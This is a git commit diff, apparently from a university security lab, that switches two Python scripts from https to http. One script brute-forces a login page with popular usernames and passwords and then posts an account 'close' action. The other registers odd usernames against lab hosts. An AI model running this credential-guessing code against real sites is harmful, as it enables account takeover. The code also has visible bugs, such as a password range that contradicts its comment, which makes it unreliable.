b949650efb7e1550df84bf3b017b531f945d922c
Desiree Khoo <dhkhoo@usc.edu>
2023-03-23 16:30:35 -0700

    updated to http instead of https

--- special_username.py
+++ special_username.py
@@ -12,7 +12,7 @@ for username in usernames:
     # username from first command line argument, password from second
     # set password as random number between 0 and 1000
     password = random.randint(0, 100)
-    url = 'https://blue/register.php?user=' + username + '&pass=' + password
+    url = 'http://blue/register.php?user=' + username + '&pass=' + password
     # see if weird passwrod breaks the system
 
     r = requests.post(url)
--- weakpass.py
+++ weakpass.py
@@ -9,13 +9,13 @@ with open('popular-usernames.csv', 'r') as f:
     
 for username in usernames:
     for password in passwords:
-        url = 'https://uscbank5/login.php?user=' + username + '&pass=' + password
+        url = 'http://blue/login.php?user=' + username + '&pass=' + password
         
         # Send the login request and check if it was successful
         response = requests.post(url)
         if "Invalid username or password" not in response.text:
             print("Found weak username and password: " + username + " " + password)
         else:
-            url_manage = 'https://uscbank5/manage.php?action=close'
+            url_manage = 'http://blue/manage.php?action=close'
             r2 = requests.post(url_manage, cookies=response.cookies)
             # success
